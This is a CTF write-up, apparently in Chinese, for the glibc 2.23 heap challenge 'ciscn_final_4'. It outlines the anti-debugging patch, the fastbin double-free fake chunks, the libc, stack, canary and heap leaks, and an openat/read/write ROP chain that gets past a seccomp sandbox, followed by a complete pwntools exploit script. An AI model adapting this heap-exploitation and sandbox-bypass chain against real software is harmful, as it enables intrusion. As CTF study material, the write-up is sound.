[toc]

# 前置知识

- `fastbin attack`
- `orw`
- 通过`_environ`泄露栈地址
- 反调试

# 整体思路

`glibc2.23`

虽然前置知识看起来比较少，但是题目还是比较复杂的。

程序首先有反调试，用`ida`插件`patch`掉然后导出`patch`后的文件来做

此外程序开了沙箱禁用了`execve`，需要用`orw`

还手写了一个逻辑不能调用`2`的系统调用，也就是`open`，用`openat`即可

整体上来说就是多次使用`double free`到处申请`fake chunk`

首先栈上输入一串数据，可以输入`/flag`字符串和`0x61`以及`0x71`等以作备用

接下来`UAF`泄露`libc`

再打`double free`申请栈上`chunk_size`处的`fake chunk`来改`chunk[0]`指针指向`_environ`，打印获得栈地址

接下来打`double free`错位申请到`new`函数`rbp`上面的`fake chunk`劫持执行流

在`heap`里面写`gadgets`来`orw`

# exp

```python
from pwn import *
from LibcSearcher import *

filename = './ciscn_final_4_patch'
context(log_level='debug')
local = 0
elf = ELF(filename)
libc = ELF('/glibc/2.23-0ubuntu11_amd64/libc.so.6')

if local:
    sh = process(filename)
else:
    sh = remote('node4.buuoj.cn', 28172)

def debug():
    pid = util.proc.pidof(sh)[0]
    gdb.attach(pid)
    pause()

choice_words = '>> '

menu_add = 1
add_index_words = ''
add_size_words = 'size?\n'
add_content_words = 'content?\n'

menu_del = 2
del_index_words = 'index ?\n'

menu_show = 3
show_index_words = 'index ?\n'

menu_edit = 4
edit_index_words = 'Idx: '
edit_size_words = ''
edit_content_words = ''

def add(index=-1, size=-1, content=''):
    sh.sendlineafter(choice_words, str(menu_add))
    if add_index_words:
        sh.sendlineafter(add_index_words, str(index))
    if add_size_words:
        sh.sendlineafter(add_size_words, str(size))
    if add_content_words:
        sh.sendafter(add_content_words, content)

def delete(index=-1):
    sh.sendlineafter(choice_words, str(menu_del))
    if del_index_words:
        sh.sendlineafter(del_index_words, str(index))

def show(index=-1):
    sh.sendlineafter(choice_words, str(menu_show))
    if show_index_words:
        sh.sendlineafter(show_index_words, str(index))

def edit(index=-1, size=-1, content=''):
    sh.sendlineafter(choice_words, str(menu_edit))
    if edit_index_words:
        sh.sendlineafter(edit_index_words, str(index))
    if edit_size_words:
        sh.sendlineafter(edit_size_words, str(size))
    if edit_content_words:
        sh.sendafter(edit_content_words, content)

def leak_info(name, addr):
    success('{} => {}'.format(name, hex(addr)))


# 开始之前在栈上输入一串字符串，其中包含/flag字符串用于以后orw，后面还写了一些0x71或者0x61用于fastbinattack，有的可能没用到
sh.recv()
payload = b'/flag\x00aaaaaaaaaa' + b'a'*0xd0 + p64(0) + p64(0x71) + p64(0) + p8(0x61)
sh.send(payload)
# 创建一个大小为0x90的属于unsortedbin的chunk，使用UAF获取libc地址
add(size=0x80, content='aaaa') # 0
add(size=0x20, content='aaaa') # 1
delete(index=0)
show(index=0)
libc_leak = u64(sh.recv(6).ljust(8, b'\x00'))
leak_info('libc_leak', libc_leak)
libc.address = libc_leak - 0x3c4b78
leak_info('libc.address', libc.address)
# libc中的environ存放了位于栈上的环境变量，打印出environ中的值可以获得栈地址
environ = libc.sym['_environ']
leak_info('_environ', environ)
add(size=0x80, content='aaaa') # 0 2
add(size=0x70, content='aaaa') # 3
add(size=0x70, content='aaaa') # 4
add(size=0x80, content='aaaa') # 5
add(size=0x80, content='aaaa') # 6
# 使用double free在chunk_size的地方申请到chunk，并且改chunk[0]的指针指向environ，从而打印出栈地址
delete(index=3)
delete(index=4)
delete(index=3)
add(size=0x70, content=p64(0x602050)) # 7
add(size=0x70, content=p64(0x602050)) # 8
add(size=0x70, content=p64(0x602050)) # 9
payload = b'a'*0x60 + p64(environ)
add(size=0x70, content=payload) # 10
show(index=0)
stack_leak = u64(sh.recv(6).ljust(8, b'\x00'))
leak_info('stack_leak', stack_leak)
input_stack = stack_leak - 0x208
offset_input_rip = 0x118
leak_info('input_stack', input_stack)
fake_stack_chunk = input_stack + 0xf0
leak_info('fake_stack_chunk', fake_stack_chunk)
# 使用double free申请到栈上，泄露canary
add(size=0x50, content=b'aaaa') # 11
add(size=0x50, content=b'aaaa') # 12
delete(index=11)
delete(index=12)
delete(index=11)
payload = p64(fake_stack_chunk)
add(size=0x50, content=payload) # 13
add(size=0x50, content=payload) # 14
add(size=0x50, content=payload) # 15

add(size=0x50, content=b'a'*9) # 16
show(index=16)
sh.recvuntil(b'a'*9, drop=True)
canary = u64(sh.recv(7).rjust(8, b'\x00'))
leak_info('canary', canary)

leak_info('fake_stack_chunk', fake_stack_chunk)
# debug()
# 接下来要劫持程序执行流，而main函数中是死循环难以劫持rip，因此劫持new函数的rip
# 在new函数的rbp上面构造fake chunk，打double free
# 在这之前泄露堆地址，在堆里面布置gadgets从而orw
fake_new_chunk = fake_stack_chunk - 0x12e
add(size=0x30, content='bbbb') # 17
add(size=0x30, content='bbbb') # 18
delete(index=17)
delete(index=18)
delete(index=17)
show(index=17)
heap_leak = u64(sh.recv(4).ljust(8, b'\x00'))
heap_base = heap_leak - 0x3e0
gadgets_addr = heap_base + 0x430
leak_info('heap_base', heap_base)
leak_info('gadgets', gadgets_addr)
payload = p64(fake_new_chunk)
add(size=0x30, content=payload) # 19
add(size=0x30, content=payload) # 20
add(size=0x30, content=payload) # 21
pop_rdi = p64(libc.address + 0x21102)
pop_rdx = p64(libc.address + 0x1b92)
pop_rsi = p64(libc.address + 0x202e8)
pop_rax = p64(libc.address + 0x33544)
syscall = p64(libc.address + 0xbc375)
leave_ret = p64(libc.address + 0x42351)
gadgets = gadgets_addr & 0x00000000000fffff
leak_info('gadgets', gadgets_addr)
# payload = p64(0xdeadbeaf) + pop_rdi + p64(input_stack) + pop_rsi + p64(0) + pop_rax + p64(2) + syscall
payload = p64(0xdeadbeaf) + pop_rdi + p64(0) + pop_rsi + p64(input_stack) + p64(libc.sym['openat'])
payload += pop_rdi + p64(3) + pop_rsi + p64(input_stack + 0x10) + pop_rdx + p64(0x30) + pop_rax + p64(0) + syscall
payload += pop_rdi + p64(1) + pop_rsi + p64(input_stack + 0x10) + pop_rdx + p64(0x30) + pop_rax + p64(1) + syscall
add(size=0x100, content=payload)
payload = b'\x00'*6 + p64(canary) + p64(gadgets_addr) + leave_ret
# debug()
add(size=0x30, content=payload) # 21
# pause()
sh.recv()
# debug()
```

